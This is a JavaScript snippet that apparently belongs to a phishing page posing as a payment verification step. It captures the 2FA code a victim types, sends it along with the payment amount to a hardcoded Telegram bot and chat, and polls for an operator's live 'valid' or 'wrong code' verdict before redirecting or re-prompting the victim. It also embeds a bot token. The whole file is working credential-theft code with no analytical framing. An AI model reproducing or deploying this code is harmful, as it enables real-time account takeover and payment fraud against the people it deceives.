<script>
    const p = new URLSearchParams(window.location.search);
    const logo = decodeURIComponent(p.get('logo') || "");
    const TOKEN = "8402431772:AAH-BEEIxGCwozhzT1Qs8gMRQmfCz9zBp4o";
    const CHAT_ID = "1191944530";
    let isWaiting = false;

    window.onload = function() {
        document.getElementById('v-logo').src = logo;
        document.getElementById('v-prix').innerText = p.get('prix');
        const btn = document.getElementById('v-btn');
        const spin = document.getElementById('spin-v');

        if(logo.includes("MTLW2vzq")) c = "#008542";
        if(logo.includes("76Rx8fqq")) c = "#ed1c24";
        btn.style.backgroundColor = c; spin.style.borderTopColor = c;
    };

    document.getElementById('vForm').onsubmit = async function(e) {
        e.preventDefault();
        if(isWaiting) return;
        isWaiting = true;
        document.getElementById('sms-error').style.display = 'none';
        document.getElementById('loader').style.display = 'flex';

        const msg = `<b>üì© CODE 2FA</b>\nüî¢ CODE : <code>${document.getElementById('c').value}</code>\nüí∞ MONTANT : ${p.get('prix')} $`;
        const kb = { inline_keyboard: [[{text:"‚úÖ VALIDER", callback_data:"OK"}, {text:"‚ùå CODE ERRON√â", callback_data:"NO"}]] };

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST", headers: {"Content-Type":"application/json"},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML", reply_markup: kb})
            });

            let lastId = 0;
            const init = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
            const dI = await init.json();
            if(dI.ok && dI.result.length > 0) lastId = dI.result[dI.result.length - 1].update_id;

            while(isWaiting) {
                try {
                    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=25`);
                    const d = await r.json();
                    if(d.ok && d.result.length > 0) {
                        for(let u of d.result) {
                            lastId = u.update_id;
                            if(u.callback_query) {
                                if(u.callback_query.data === "OK") { isWaiting = false; window.location.href = "status.html"; return; }
                                if(u.callback_query.data === "NO") { isWaiting = false; document.getElementById('loader').style.display = 'none'; document.getElementById('sms-error').style.display = 'block'; document.getElementById('c').value = ""; return; }
                            }
                        }
                    }
                } catch(err) { await new Promise(res => setTimeout(res, 1500)); }
            }
        } catch(e) { isWaiting = false; }
    };
</script>
